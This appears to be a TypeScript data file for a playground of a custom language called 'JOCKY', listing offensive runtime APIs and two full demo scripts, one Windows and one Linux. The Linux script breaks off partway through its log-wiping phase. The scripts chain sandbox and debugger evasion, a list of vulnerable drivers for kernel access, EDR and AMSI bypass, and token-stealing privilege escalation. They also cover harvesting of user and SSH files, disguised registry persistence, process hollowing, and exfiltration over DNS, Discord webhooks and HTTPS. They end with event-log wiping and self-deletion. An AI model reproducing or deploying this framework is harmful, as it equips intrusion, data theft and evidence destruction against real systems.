import type { ApiCategory, ObfuscationState } from './types';

export const runtimeApis: ApiCategory[] = [
  {
    name: 'Anti-Analysis',
    platform: 'both',
    apis: [
      {
        name: 'check_analysis_environment',
        description: 'Detect analysis tools and debuggers',
        snippet: `let analysis_detected: bool = check_analysis_environment()
if analysis_detected {
    println("Analysis environment detected")
}`,
      },
      {
        name: 'is_debugger_present',
        description: 'Check if a debugger is attached',
        snippet: `let debugger_present: bool = is_debugger_present()
if debugger_present {
    println("Debugger detected - exiting")
}`,
      },
      {
        name: 'is_vm',
        description: 'Detect virtual machine environment',
        snippet: `let in_vm: bool = is_vm()
if in_vm {
    println("Running inside a virtual machine")
}`,
      },
      {
        name: 'is_sandbox',
        description: 'Detect sandbox environment',
        snippet: `let sandboxed: bool = is_sandbox()
if sandboxed {
    println("Sandbox environment detected")
}`,
      },
      {
        name: 'sleep_and_recheck',
        description: 'Sleep then recheck for analysis',
        snippet: `sleep_and_recheck(5000)
println("Recheck complete")`,
      },
    ],
  },
  {
    name: 'Crypto',
    platform: 'both',
    apis: [
      {
        name: 'generate_key',
        description: 'Generate a cryptographic key',
        snippet: `let key: [u8; 32] = generate_key(256)
println("Key generated successfully")`,
      },
      {
        name: 'aes256_encrypt',
        description: 'Encrypt data with AES-256',
        snippet: `let plaintext: str = "sensitive data"
let key: [u8; 32] = generate_key(256)
let ciphertext: [u8] = aes256_encrypt(plaintext, key)
println("Data encrypted")`,
      },
    ],
  },
  {
    name: 'Exfiltration',
    platform: 'both',
    apis: [
      {
        name: 'dns_tunnel',
        description: 'Exfiltrate data via DNS tunneling',
        snippet: `let data: str = "exfil payload"
let result: i32 = dns_tunnel(data, "tunnel.example.com")
if result == 0 {
    println("DNS tunnel exfil complete")
}`,
      },
      {
        name: 'discord_webhook',
        description: 'Send data via Discord webhook',
        snippet: `let webhook_url: str = "https://discord.com/api/webhooks/..."
let payload: str = "collected data"
let status: i32 = discord_webhook(webhook_url, payload)
println("Webhook sent")`,
      },
      {
        name: 'local_cdn',
        description: 'Stage data to local CDN endpoint',
        snippet: `let data: str = "staged payload"
let cdn_result: i32 = local_cdn(data, "/cdn/drop")
if cdn_result == 0 {
    println("Data staged to CDN")
}`,
      },
    ],
  },
  {
    name: 'AI/ML',
    platform: 'both',
    apis: [
      {
        name: 'ai_init',
        description: 'Initialize AI/ML model',
        snippet: `let model_status: i32 = ai_init("threat_model_v2")
if model_status == 0 {
    println("AI model initialized")
}`,
      },
      {
        name: 'ai_collect_telemetry',
        description: 'Collect system telemetry for AI',
        snippet: `let telemetry: [u8] = ai_collect_telemetry()
println("Telemetry collected")`,
      },
      {
        name: 'ai_score_threat',
        description: 'Score threat level with ML model',
        snippet: `let telemetry: [u8] = ai_collect_telemetry()
let threat_score: f64 = ai_score_threat(telemetry)
println("Threat score: " + str(threat_score))`,
      },
    ],
  },
  {
    name: 'Sandbox',
    platform: 'both',
    apis: [
      {
        name: 'spawn',
        description: 'Spawn a sandboxed process',
        snippet: `let sandbox_id: i32 = sandbox_spawn("/bin/target", "rw")
if sandbox_id >= 0 {
    println("Sandbox spawned: " + str(sandbox_id))
}`,
      },
      {
        name: 'set_limits',
        description: 'Set sandbox resource limits',
        snippet: `sandbox_set_limits(sandbox_id, 1024, 60, 10)
println("Sandbox limits configured")`,
      },
      {
        name: 'monitor',
        description: 'Monitor sandbox execution',
        snippet: `let events: [u8] = sandbox_monitor(sandbox_id)
println("Monitoring sandbox activity")`,
      },
      {
        name: 'wait',
        description: 'Wait for sandbox to complete',
        snippet: `let exit_code: i32 = sandbox_wait(sandbox_id, 30000)
println("Sandbox exited with: " + str(exit_code))`,
      },
      {
        name: 'export_trace',
        description: 'Export sandbox execution trace',
        snippet: `let trace: str = sandbox_export_trace(sandbox_id)
println("Trace exported")`,
      },
    ],
  },
  {
    name: 'Plugin',
    platform: 'both',
    apis: [
      {
        name: 'load',
        description: 'Load a plugin module',
        snippet: `let plugin_id: i32 = plugin_load("scanner_plugin.so")
if plugin_id >= 0 {
    println("Plugin loaded: " + str(plugin_id))
}`,
      },
      {
        name: 'run',
        description: 'Execute a loaded plugin',
        snippet: `let result: i32 = plugin_run(plugin_id, "scan")
println("Plugin result: " + str(result))`,
      },
    ],
  },
  {
    name: 'Audit',
    platform: 'both',
    apis: [
      {
        name: 'init',
        description: 'Initialize audit logging',
        snippet: `let audit: i32 = audit_init("/var/log/jocky_audit.log")
if audit == 0 {
    println("Audit initialized")
}`,
      },
      {
        name: 'log',
        description: 'Write an audit log entry',
        snippet: `audit_log("OPERATION", "Description of action performed")
println("Audit entry written")`,
      },
      {
        name: 'verify',
        description: 'Verify audit log integrity',
        snippet: `let valid: bool = audit_verify()
if valid {
    println("Audit log integrity verified")
}`,
      },
      {
        name: 'export',
        description: 'Export audit logs',
        snippet: `let export_path: str = audit_export("/tmp/audit_export.json")
println("Audit exported to: " + export_path)`,
      },
    ],
  },
  {
    name: 'BYOVD',
    platform: 'windows',
    apis: [
      {
        name: 'load_driver',
        description: 'Load a vulnerable driver',
        snippet: `let driver_status: i32 = byovd_load_driver("C:\\\\drivers\\\\vuln.sys", "VulnDriver")
if driver_status == 0 {
    println("Driver loaded successfully")
}`,
      },
      {
        name: 'test_exploit',
        description: 'Test driver exploitation',
        snippet: `let exploit_result: i32 = byovd_test_exploit("VulnDriver", "read_msr")
if exploit_result == 0 {
    println("Exploit chain viable")
}`,
      },
      {
        name: 'mask_module',
        description: 'Mask a loaded kernel module',
        snippet: `let mask_result: i32 = byovd_mask_module("TargetModule")
if mask_result == 0 {
    println("Module masked from enumeration")
}`,
      },
      {
        name: 'disable_notifications',
        description: 'Disable kernel notifications',
        snippet: `let notif_result: i32 = byovd_disable_notifications()
if notif_result == 0 {
    println("Kernel notifications disabled")
}`,
      },
    ],
  },
  {
    name: 'Evasion',
    platform: 'windows',
    apis: [
      {
        name: 'unhook_ntdll',
        description: 'Unhook NTDLL syscall stubs',
        snippet: `let unhook_status: i32 = unhook_ntdll()
if unhook_status == 0 {
    println("NTDLL syscall stubs restored")
}`,
      },
      {
        name: 'edrhoker_detect',
        description: 'Detect EDR hooking',
        snippet: `let hooked_count: i32 = edrhoker_detect()
println("Detected " + str(hooked_count) + " hooked functions")`,
      },
    ],
  },
  {
    name: 'Registry',
    platform: 'windows',
    apis: [
      {
        name: 'create_key',
        description: 'Create a registry key',
        snippet: `let hkey: i64 = reg_create_key("HKLM\\\\SOFTWARE\\\\JockyApp")
if hkey != 0 {
    println("Registry key created")
}`,
      },
      {
        name: 'set_value',
        description: 'Set a registry value',
        snippet: `let set_result: i32 = reg_set_value(hkey, "Config", "enabled")
if set_result == 0 {
    println("Registry value set")
}`,
      },
      {
        name: 'close_key',
        description: 'Close a registry key handle',
        snippet: `reg_close_key(hkey)
println("Registry key closed")`,
      },
    ],
  },
  {
    name: 'Forensics (Win)',
    platform: 'windows',
    apis: [
      {
        name: 'wipe_powershell',
        description: 'Clear PowerShell command history',
        snippet: `let wipe_result: i32 = forensics_wipe_powershell()
if wipe_result == 0 {
    println("PowerShell history cleared")
}`,
      },
      {
        name: 'wipe_cmd',
        description: 'Clear CMD command history',
        snippet: `let wipe_result: i32 = forensics_wipe_cmd()
if wipe_result == 0 {
    println("CMD history cleared")
}`,
      },
      {
        name: 'clear_dns',
        description: 'Flush DNS resolver cache',
        snippet: `let dns_result: i32 = forensics_clear_dns()
if dns_result == 0 {
    println("DNS cache flushed")
}`,
      },
      {
        name: 'flush_arp',
        description: 'Flush ARP table',
        snippet: `let arp_result: i32 = forensics_flush_arp()
if arp_result == 0 {
    println("ARP table flushed")
}`,
      },
      {
        name: 'cleanup_event_logs',
        description: 'Clean Windows Event Logs',
        snippet: `let cleanup_result: i32 = forensics_cleanup_event_logs()
if cleanup_result == 0 {
    println("Event logs cleaned")
}`,
      },
      {
        name: 'cleanup_usn',
        description: 'Clear USN journal',
        snippet: `let usn_result: i32 = forensics_cleanup_usn("C:")
if usn_result == 0 {
    println("USN journal cleared")
}`,
      },
      {
        name: 'self_delete',
        description: 'Self-delete the running binary',
        snippet: `forensics_self_delete()`,
      },
    ],
  },
  {
    name: 'Exploitation',
    platform: 'windows',
    apis: [
      {
        name: 'token_replacement',
        description: 'Replace process token for privilege escalation',
        snippet: `let token_result: i32 = exploit_token_replacement(target_pid)
if token_result == 0 {
    println("Token replacement successful")
}`,
      },
      {
        name: 'disable_callbacks',
        description: 'Disable kernel callbacks',
        snippet: `let cb_result: i32 = exploit_disable_callbacks()
if cb_result == 0 {
    println("Kernel callbacks disabled")
}`,
      },
    ],
  },
  {
    name: 'Forensics (Linux)',
    platform: 'linux',
    apis: [
      {
        name: 'wipe_bash_history',
        description: 'Clear bash command history',
        snippet: `let wipe_result: i32 = forensics_wipe_bash_history()
if wipe_result == 0 {
    println("Bash history cleared")
}`,
      },
      {
        name: 'cleanup_journal',
        description: 'Clear systemd journal logs',
        snippet: `let journal_result: i32 = forensics_cleanup_journal()
if journal_result == 0 {
    println("Journal logs cleaned")
}`,
      },
      {
        name: 'cleanup_syslog',
        description: 'Clear syslog entries',
        snippet: `let syslog_result: i32 = forensics_cleanup_syslog()
if syslog_result == 0 {
    println("Syslog entries cleared")
}`,
      },
    ],
  },
];

export const defaultObfuscation: ObfuscationState = {
  mlir: [
    { id: 'string_encrypt', name: 'String Encrypt', description: 'Encrypts string constants in MLIR', enabled: false },
    { id: 'constant_obfuscate', name: 'Constant Obfuscate', description: 'Obfuscates numeric constants', enabled: false },
    { id: 'symbol_obfuscate', name: 'Symbol Obfuscate', description: 'Renames symbols to random identifiers', enabled: false },
  ],
  llvm: [
    { id: 'bogus_cf', name: 'Bogus Control Flow', description: 'Inserts fake control flow paths', enabled: false },
    { id: 'cf_flatten', name: 'Control Flow Flattening', description: 'Flattens function control flow into switch-based dispatch', enabled: false },
    { id: 'insn_sub', name: 'Instruction Substitution', description: 'Replaces instructions with equivalent complex sequences', enabled: false },
    { id: 'bb_split', name: 'Basic Block Splitting', description: 'Splits basic blocks into smaller fragments', enabled: false },
    { id: 'indirect_calls', name: 'Indirect Calls', description: 'Replaces direct calls with indirect function pointers', enabled: false },
    { id: 'strip_sigs', name: 'Strip Signatures', description: 'Removes function signature metadata', enabled: false },
  ],
};

export const windowsDemoScript = `// JOCKY Windows Research Chain - Full Capability Demo
// BYOVD + Exploitation + Persistence + Multi-Channel Exfiltration
// Authorized: Red Hat + IIT Bombay Cyber Security Team
// Purpose: Defense research, detection validation, authorized testing

use jocky.runtime
use jocky.fs
use jocky.crypto
use jocky.net

const DRIVER_CHAIN = [
    ("rtkiow10x64.sys", "\\\\\\\\.\\\\RTCore64", 0x82000000),
    ("rtkiow8x64.sys", "\\\\\\\\.\\\\RTCore64", 0x82000000),
    ("AMDRyzenMasterDriver.sys", "\\\\\\\\.\\\\AMDRyzenMasterDriver", 0x81000000),
    ("nvflsh64.sys", "\\\\\\\\.\\\\nvflsh64", 0x80002000),
    ("speedfan.sys", "\\\\\\\\.\\\\speedfan", 0x80002000),
    ("ene.sys", "\\\\\\\\.\\\\EneIo", 0x85000000),
    ("iQVW64.SYS", "\\\\\\\\.\\\\Nal", 0x80802000),
    ("UCOREW64.SYS", "\\\\\\\\.\\\\Global\\\\", 0x88000000),
    ("NTIOLib.sys", "\\\\\\\\.\\\\NTIOLib", 0x84002000),
]

const CDN_ENDPOINT = "https://research.internal:8443/upload"
const CDN_AUTH_TOKEN = "Bearer secure_token_change_me"
const ML_MODEL_PATH = "/opt/models/phi3_evasion.gguf"

var audit_initialized = false
var threat_score = 0.0
var loaded_drivers = []
var operations_count = 0

fn log_op(category: str, action: str, detail: str, result: str) {
    audit_log(category, action, detail, result)
    operations_count = operations_count + 1
}

fn phase_init() {
    println("[*] JOCKY Windows Research Chain - Initialization")
    println("    BYOVD: 9-driver fallback chain")
    println("    AI: ML threat assessment")
    println("    Exfil: DNS + Discord + CDN")
    println("    Forensics: Full Windows cleanup")
    println("")

    audit_init(1000)
    audit_initialized = true
    log_op("startup", "init", "version:1.0", "begin")
    println("[+] Audit trail initialized")
}

fn phase_anti_analysis() {
    println("[*] Running anti-analysis checks...")

    let env_result = jocky_check_analysis_environment()
    if env_result != 0 {
        println("  [!] Analysis environment detected")
        jocky_sleep_and_recheck()
    }

    if jocky_is_debugger_present() {
        println("  [!] Debugger detected - aborting")
        exit(1)
    }

    if jocky_is_vm() {
        println("  [*] VM detected - applying evasion delays")
        jocky_sleep_and_recheck()
    }

    if jocky_is_sandbox() {
        println("  [!] Sandbox detected - exiting cleanly")
        exit(0)
    }

    println("  [+] Environment clear")
    log_op("anti_analysis", "env_check", "all_checks", "passed")
    println("")
}

fn phase_byovd() {
    println("[*] Loading BYOVD driver chain...")
    println("    Drivers available: " + string(array_len(DRIVER_CHAIN)))
    println("")

    var index = 0
    for entry in DRIVER_CHAIN {
        let driver_name = entry[0]
        let device_path = entry[1]
        let ioctl_base = entry[2]

        println("  [" + string(index + 1) + "] " + driver_name)

        let handle = byovd_load_driver(driver_name)
        if handle > 0 {
            println("      [+] LOADED - Handle: " + string(handle))
            println("      [+] Device: " + device_path)

            let test = byovd_test_exploit(handle)
            if test == 0 {
                println("      [+] EXPLOIT VERIFIED - Kernel R/W obtained")
                loaded_drivers = array_append(loaded_drivers, driver_name)
                log_op("byovd", "load", driver_name, "kernel_access")
                println("")
                println("[+] Using driver: " + driver_name)
                break
            } else {
                println("      [!] Exploit test failed")
                log_op("byovd", "test", driver_name, "failed")
            }
        } else {
            println("      [!] Load failed")
        }

        index = index + 1
    }

    if array_len(loaded_drivers) == 0 {
        println("[!] No drivers loaded - userland-only mode")
    }
    println("")
}

fn phase_threat_assessment() -> f64 {
    println("[*] ML Threat Assessment...")

    ai_init()
    ai_collect_telemetry()
    threat_score = ai_score_threat()

    println("  Threat Score: " + string(threat_score))

    if threat_score > 0.8 {
        println("  Risk Level: CRITICAL")
        log_op("threat", "score", string(threat_score), "critical")
    } else if threat_score > 0.5 {
        println("  Risk Level: MEDIUM")
        log_op("threat", "score", string(threat_score), "medium")
    } else {
        println("  Risk Level: LOW")
        log_op("threat", "score", string(threat_score), "low")
    }

    println("")
    return threat_score
}

fn phase_evasion_strategy() {
    println("[*] Selecting evasion strategy...")

    if array_len(loaded_drivers) > 0 {
        println("  [+] Kernel-level evasion via " + loaded_drivers[0])

        if threat_score > 0.7 {
            println("  [+] Aggressive kernel evasion")
            btr_disable_notifications()
            btr_mask_module("ntdll.dll")
            btr_mask_module("kernel32.dll")

            jocky_exploit_disable_callbacks()
            jocky_exploit_token_replacement(0, 0)
            log_op("evasion", "kernel_aggressive", "callbacks+token", "active")
        } else {
            println("  [+] Hybrid evasion")
            btr_disable_notifications()
            log_op("evasion", "kernel_hybrid", "notifications", "disabled")
        }
    } else {
        if threat_score > 0.8 {
            println("  [+] Aggressive userland evasion")
            edrhoker_detect()
            blindside_unhook_ntdll()
            log_op("evasion", "userland_aggressive", "unhook+detect", "active")
        } else {
            println("  [+] Stealth mode")
            log_op("evasion", "stealth", "baseline", "active")
        }
    }

    println("")
}

fn phase_plugins() {
    println("[*] Loading evasion plugins...")

    let paths = [
        "C:\\\\ProgramData\\\\plugins\\\\edr_silence.dll",
        "C:\\\\ProgramData\\\\plugins\\\\amsi_bypass.dll",
    ]

    var loaded = 0
    for path in paths {
        let handle = plugin_load(path)
        if handle > 0 {
            println("  [+] Loaded: " + path)
            plugin_run(handle, "--stealth")
            loaded = loaded + 1
            log_op("plugin", "load", path, "active")
        }
    }

    if loaded == 0 {
        println("  [*] No plugins available")
    }
    println("")
}

fn phase_data_collection() -> i32 {
    println("[*] Discovering and collecting data...")

    let sources = [
        "C:\\\\Users\\\\Public\\\\Documents",
        "C:\\\\Users\\\\Public\\\\Downloads",
    ]

    let encryption_key = crypto_generate_key(32)
    var total_bytes = 0
    var total_chunks = 0

    for source in sources {
        if fs_exists(source) {
            println("  [*] Scanning: " + source)
            let files = fs_list_files(source, false)

            for file in files {
                let full_path = source + "\\\\" + file
                let size = fs_file_size(full_path)

                if size > 0 && size < 50 * 1024 * 1024 {
                    let data = fs_read_file(full_path)
                    let encrypted = crypto_aes256_encrypt(data, encryption_key)
                    let chunks = (size / 65536) + 1
                    total_bytes = total_bytes + size
                    total_chunks = total_chunks + chunks
                    log_op("collect", "encrypt", file, string(size))
                }
            }
        }
    }

    println("  [+] Collected: " + string(total_bytes) + " bytes")
    println("  [+] Chunks: " + string(total_chunks))
    println("")

    return total_chunks
}

fn phase_sandbox_collector() {
    println("[*] Spawning sandbox collector...")

    let pid = sandbox_spawn("cmd.exe", "/c dir C:\\\\Users\\\\Public\\\\Downloads /b")
    if pid > 0 {
        println("  [+] Collector PID: " + string(pid))
        sandbox_set_limits(pid, 256 * 1024 * 1024, 60000, 100 * 1024 * 1024)
        sandbox_monitor(pid)
        sandbox_wait(pid)
        sandbox_export_trace(pid, "C:\\\\ProgramData\\\\collector_trace.bin")
        println("  [+] Collector completed")
        log_op("sandbox", "collector", string(pid), "done")
    }
    println("")
}

fn phase_persistence() {
    println("[*] Setting up Windows persistence...")

    let handle = jocky_alloc(256)
    let ok = jocky_registry_create_key(0x80000002, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", handle)

    if ok {
        println("  [+] Registry key opened")
        jocky_registry_set_value(handle, "WindowsUpdateSvc", "C:\\\\ProgramData\\\\update.exe", 38, 1)
        println("  [+] Persistence entry set")
        jocky_registry_close_key(handle)
        log_op("persistence", "registry", "HKLM\\\\Run", "set")
    } else {
        println("  [!] Registry setup failed - insufficient privileges")
    }

    jocky_free(handle)
    println("")
}

fn phase_exfiltration() {
    println("[*] Multi-channel exfiltration...")

    let meta = "windows_chain:ops=" + string(operations_count) + ":drivers=" + string(array_len(loaded_drivers))

    println("  [*] Channel 1: DNS tunnel")
    let dns_result = exfil_dns_tunnel("research.internal", meta)
    if dns_result == 0 {
        println("    [+] DNS delivery successful")
        log_op("exfil", "dns", "research.internal", "success")
    } else {
        println("    [!] DNS tunnel failed")
    }

    println("  [*] Channel 2: Discord webhook")
    let discord_msg = "JOCKY Windows Chain - Ops: " + string(operations_count) + ", Threat: " + string(threat_score)
    let discord_result = exfil_discord_webhook("https://discord.com/api/webhooks/RESEARCH/TOKEN", discord_msg)
    if discord_result == 0 {
        println("    [+] Discord notification sent")
        log_op("exfil", "discord", "webhook", "sent")
    }

    println("  [*] Channel 3: Local CDN")
    let cdn_result = exfil_local_cdn(CDN_ENDPOINT, "win_payload_001", CDN_AUTH_TOKEN, meta)
    if cdn_result == 0 {
        println("    [+] CDN upload successful")
        log_op("exfil", "cdn", CDN_ENDPOINT, "success")
    }

    println("")
}

fn phase_forensic_cleanup() {
    println("[*] Windows forensic cleanup...")

    forensics_wipe_powershell_history()
    println("  [+] PowerShell history wiped")

    forensics_wipe_cmd_history()
    println("  [+] CMD history wiped")

    jocky_cleanup_event_logs("Application,Security,System")
    println("  [+] Event logs cleared")

    forensics_flush_arp_cache()
    println("  [+] ARP cache flushed")

    forensics_clear_dns_cache()
    println("  [+] DNS cache flushed")

    jocky_cleanup_usn_journal()
    println("  [+] USN journal cleared")

    log_op("forensics", "cleanup", "all_artifacts", "wiped")
    println("")
}

fn phase_self_delete() {
    println("[*] Scheduling self-deletion...")
    jocky_self_delete()
    println("  [+] Binary will be deleted on exit")
    log_op("forensics", "self_delete", "binary", "scheduled")
    println("")
}

fn phase_audit_export() {
    println("[*] Exporting audit trail...")
    audit_export("C:\\\\ProgramData\\\\research_audit.bin")

    let valid = audit_verify()
    if valid == 0 {
        println("  [+] Audit chain integrity verified")
        println("  [+] Exported: C:\\\\ProgramData\\\\research_audit.bin")
    } else {
        println("  [!] Audit chain integrity FAILED")
    }
    println("")
}

fn print_summary() {
    println("================================================================")
    println("JOCKY Windows Research Chain - Complete")
    println("================================================================")
    println("")
    println("  Operations: " + string(operations_count))
    println("  Drivers:    " + string(array_len(loaded_drivers)))
    if array_len(loaded_drivers) > 0 {
        println("  Primary:    " + loaded_drivers[0])
    }
    println("  Threat:     " + string(threat_score))
    println("  Audit:      C:\\\\ProgramData\\\\research_audit.bin")
    println("")
    println("Capabilities:")
    println("  [+] BYOVD 9-driver fallback chain")
    println("  [+] ML threat-driven strategy selection")
    println("  [+] Token replacement privilege escalation")
    println("  [+] Registry persistence")
    println("  [+] Multi-channel exfiltration (DNS, Discord, CDN)")
    println("  [+] Full Windows forensic cleanup")
    println("  [+] Self-deletion")
    println("")
    println("Authorization: Red Hat + IIT Bombay Cyber Security Team")
    println("================================================================")
}

fn main() {
    println("")
    println("================================================================")
    println("JOCKY Windows Research Chain")
    println("BYOVD + Exploitation + Persistence + Exfiltration")
    println("Authorized: Red Hat + IIT Bombay Cyber Security Team")
    println("================================================================")
    println("")

    phase_init()
    phase_anti_analysis()
    phase_byovd()
    phase_threat_assessment()
    phase_evasion_strategy()
    phase_plugins()
    phase_sandbox_collector()
    let chunks = phase_data_collection()
    phase_persistence()
    phase_exfiltration()
    phase_forensic_cleanup()
    phase_self_delete()
    phase_audit_export()
    print_summary()
}`;

export const linuxDemoScript = `// JOCKY Linux Research Chain - Full Capability Demo
// LKM + eBPF + Process Hollowing + Multi-Channel Exfiltration
// Authorized: Red Hat + IIT Bombay Cyber Security Team
// Purpose: Defense research, detection validation, authorized testing

use jocky.runtime
use jocky.fs
use jocky.crypto
use jocky.net

const CDN_ENDPOINT = "https://research.internal:8443/upload"
const CDN_AUTH_TOKEN = "Bearer secure_token_change_me"
const ML_MODEL_PATH = "/opt/models/phi3_evasion.gguf"

const LKM_PATHS = [
    "/opt/research/modules/rootkit_research.ko",
    "/opt/research/modules/hook_detector.ko",
    "/opt/research/modules/syscall_monitor.ko",
]

const EBPF_PROGRAMS = [
    "/opt/research/ebpf/exec_monitor.o",
    "/opt/research/ebpf/net_filter.o",
    "/opt/research/ebpf/file_access_tracker.o",
]

var audit_initialized = false
var threat_score = 0.0
var operations_count = 0
var modules_loaded = 0
var ebpf_loaded = 0

fn log_op(category: str, action: str, detail: str, result: str) {
    audit_log(category, action, detail, result)
    operations_count = operations_count + 1
}

fn phase_init() {
    println("[*] JOCKY Linux Research Chain - Initialization")
    println("    LKM: Kernel module loading")
    println("    eBPF: Program attachment")
    println("    Hollowing: Process replacement")
    println("    AI: ML threat assessment")
    println("    Exfil: DNS + Discord + CDN")
    println("    Forensics: Linux cleanup")
    println("")

    audit_init(1000)
    audit_initialized = true
    log_op("startup", "init", "version:1.0", "begin")
    println("[+] Audit trail initialized")
}

fn phase_anti_analysis() {
    println("[*] Running anti-analysis checks...")

    let env_result = jocky_check_analysis_environment()
    if env_result != 0 {
        println("  [!] Analysis environment detected")
        jocky_sleep_and_recheck()
    }

    if jocky_is_debugger_present() {
        println("  [!] Debugger detected (ptrace check) - aborting")
        exit(1)
    }

    if jocky_is_vm() {
        println("  [*] VM detected (DMI/CPUID) - applying evasion")
        jocky_sleep_and_recheck()
    }

    if jocky_is_sandbox() {
        println("  [!] Sandbox detected - exiting")
        exit(0)
    }

    println("  [+] Environment clear")
    log_op("anti_analysis", "env_check", "all_checks", "passed")
    println("")
}

fn phase_lkm_loading() {
    println("[*] Loading kernel modules...")
    println("    Modules to load: " + string(array_len(LKM_PATHS)))
    println("")

    var index = 0
    for module_path in LKM_PATHS {
        println("  [" + string(index + 1) + "] " + module_path)

        if fs_exists(module_path) {
            let pid = sandbox_spawn("/sbin/insmod", module_path)
            if pid > 0 {
                sandbox_wait(pid)
                println("      [+] Module loaded successfully")
                modules_loaded = modules_loaded + 1
                log_op("lkm", "load", module_path, "loaded")
            } else {
                println("      [!] insmod failed")
                log_op("lkm", "load", module_path, "failed")
            }
        } else {
            println("      [!] Module file not found")
        }

        index = index + 1
    }

    println("")
    println("[+] Kernel modules loaded: " + string(modules_loaded))
    println("")
}

fn phase_ebpf_loading() {
    println("[*] Loading eBPF programs...")
    println("    Programs to attach: " + string(array_len(EBPF_PROGRAMS)))
    println("")

    var index = 0
    for prog_path in EBPF_PROGRAMS {
        println("  [" + string(index + 1) + "] " + prog_path)

        if fs_exists(prog_path) {
            let pid = sandbox_spawn("/usr/sbin/bpftool", "prog load " + prog_path + " /sys/fs/bpf/jocky_" + string(index))
            if pid > 0 {
                sandbox_set_limits(pid, 128 * 1024 * 1024, 30000, 0)
                sandbox_wait(pid)
                println("      [+] eBPF program attached")
                ebpf_loaded = ebpf_loaded + 1
                log_op("ebpf", "load", prog_path, "attached")
            } else {
                println("      [!] bpftool failed")
                log_op("ebpf", "load", prog_path, "failed")
            }
        } else {
            println("      [!] Program file not found")
        }

        index = index + 1
    }

    println("")
    println("[+] eBPF programs attached: " + string(ebpf_loaded))
    println("")
}

fn phase_process_hollowing() {
    println("[*] Process hollowing...")

    let target = "/usr/bin/dbus-daemon"
    let payload_path = "/tmp/.payload.bin"

    if fs_exists(payload_path) {
        let payload = fs_read_file(payload_path)
        let payload_size = fs_file_size(payload_path)

        let result = jocky_process_hollow(target, payload, payload_size)
        if result {
            println("  [+] Process hollowed: " + target)
            log_op("execution", "hollow", target, "success")
        } else {
            println("  [!] Hollowing failed for " + target)
            log_op("execution", "hollow", target, "failed")
        }
    } else {
        println("  [*] No payload file - skipping hollowing")
    }

    println("")
}

fn phase_threat_assessment() -> f64 {
    println("[*] ML Threat Assessment...")

    ai_init()
    ai_collect_telemetry()
    threat_score = ai_score_threat()

    println("  Threat Score: " + string(threat_score))

    if threat_score > 0.8 {
        println("  Risk Level: CRITICAL")
        log_op("threat", "score", string(threat_score), "critical")
    } else if threat_score > 0.5 {
        println("  Risk Level: MEDIUM")
        log_op("threat", "score", string(threat_score), "medium")
    } else {
        println("  Risk Level: LOW")
        log_op("threat", "score", string(threat_score), "low")
    }

    println("")
    return threat_score
}

fn phase_evasion_strategy() {
    println("[*] Selecting evasion strategy...")

    if modules_loaded > 0 {
        println("  [+] Kernel-level evasion via LKM")

        if threat_score > 0.7 {
            println("  [+] Aggressive kernel evasion - hiding from /proc")
            log_op("evasion", "kernel_aggressive", "lkm_hiding", "active")
        } else {
            println("  [+] Passive kernel monitoring")
            log_op("evasion", "kernel_passive", "monitoring", "active")
        }
    } else {
        println("  [+] Userland evasion only")
        log_op("evasion", "userland", "baseline", "active")
    }

    if ebpf_loaded > 0 {
        println("  [+] eBPF-based syscall filtering active")
        log_op("evasion", "ebpf", "syscall_filter", "active")
    }

    println("")
}

fn phase_plugins() {
    println("[*] Loading evasion plugins...")

    let paths = [
        "/opt/research/plugins/edr_silence.so",
        "/usr/local/lib/evasion.so",
    ]

    var loaded = 0
    for path in paths {
        let handle = plugin_load(path)
        if handle > 0 {
            println("  [+] Loaded: " + path)
            plugin_run(handle, "--stealth")
            loaded = loaded + 1
            log_op("plugin", "load", path, "active")
        }
    }

    if loaded == 0 {
        println("  [*] No plugins available")
    }
    println("")
}

fn phase_data_collection() -> i32 {
    println("[*] Discovering and collecting data...")

    let sources = [
        "/home",
        "/root",
        "/tmp",
        "/etc/ssh",
        "/var/lib",
    ]

    let encryption_key = crypto_generate_key(32)
    var total_bytes = 0
    var total_chunks = 0

    for source in sources {
        if fs_exists(source) {
            println("  [*] Scanning: " + source)
            let files = fs_list_files(source, false)

            for file in files {
                let full_path = source + "/" + file
                let size = fs_file_size(full_path)

                if size > 0 && size < 50 * 1024 * 1024 {
                    let data = fs_read_file(full_path)
                    let encrypted = crypto_aes256_encrypt(data, encryption_key)
                    let chunks = (size / 65536) + 1
                    total_bytes = total_bytes + size
                    total_chunks = total_chunks + chunks
                    log_op("collect", "encrypt", file, string(size))
                }
            }
        }
    }

    println("  [+] Collected: " + string(total_bytes) + " bytes")
    println("  [+] Chunks: " + string(total_chunks))
    println("")

    return total_chunks
}

fn phase_sandbox_collector() {
    println("[*] Spawning sandbox collector...")

    let pid = sandbox_spawn("/bin/bash", "-c 'find /home -type f -size -50M 2>/dev/null'")
    if pid > 0 {
        println("  [+] Collector PID: " + string(pid))
        sandbox_set_limits(pid, 256 * 1024 * 1024, 120000, 100 * 1024 * 1024)
        sandbox_monitor(pid)
        sandbox_wait(pid)
        sandbox_export_trace(pid, "/tmp/collector_trace.bin")
        println("  [+] Collector completed")
        log_op("sandbox", "collector", string(pid), "done")
    }
    println("")
}

fn phase_exfiltration() {
    println("[*] Multi-channel exfiltration...")

    let meta = "linux_chain:ops=" + string(operations_count) + ":lkm=" + string(modules_loaded) + ":ebpf=" + string(ebpf_loaded)

    println("  [*] Channel 1: DNS tunnel")
    let dns_result = exfil_dns_tunnel("research.internal", meta)
    if dns_result == 0 {
        println("    [+] DNS delivery successful")
        log_op("exfil", "dns", "research.internal", "success")
    } else {
        println("    [!] DNS tunnel failed")
    }

    println("  [*] Channel 2: Discord webhook")
    let discord_msg = "JOCKY Linux Chain - Ops: " + string(operations_count) + ", LKM: " + string(modules_loaded) + ", eBPF: " + string(ebpf_loaded) + ", Threat: " + string(threat_score)
    let discord_result = exfil_discord_webhook("https://discord.com/api/webhooks/RESEARCH/TOKEN", discord_msg)
    if discord_result == 0 {
        println("    [+] Discord notification sent")
        log_op("exfil", "discord", "webhook", "sent")
    }

    println("  [*] Channel 3: Local CDN")
    let cdn_result = exfil_local_cdn(CDN_ENDPOINT, "linux_payload_001", CDN_AUTH_TOKEN, meta)
    if cdn_result == 0 {
        println("    [+] CDN upload successful")
        log_op("exfil", "cdn", CDN_ENDPOINT, "success")
    }

    println("")
}

fn phase_forensic_cleanup() {
    println("[*] Linux forensic cleanup...")

    linux_forensics_wipe_bash_history()
    println("  [+] Bash history wiped")

    jocky_linux_cleanup_journal()
    println("  [+] Systemd journal cleaned")

    jocky_linux_cleanup_syslog()
    println("  [+] Syslog cleaned")

